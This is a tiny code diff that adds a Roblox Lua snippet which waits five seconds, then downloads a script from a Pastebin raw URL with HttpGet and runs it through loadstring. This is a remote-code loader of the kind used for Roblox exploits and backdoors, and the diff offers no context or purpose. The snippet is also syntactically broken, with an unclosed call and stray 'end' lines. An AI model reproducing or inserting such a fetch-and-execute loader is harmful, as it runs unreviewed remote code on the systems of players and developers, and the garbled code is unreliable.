@@ -1,0 +1,6 @@
+
+wait(5) 
+loadstring(game:HttpGet(('https://pastebin.com/raw/zbwhiX0'),true))(
+
+end
+ end
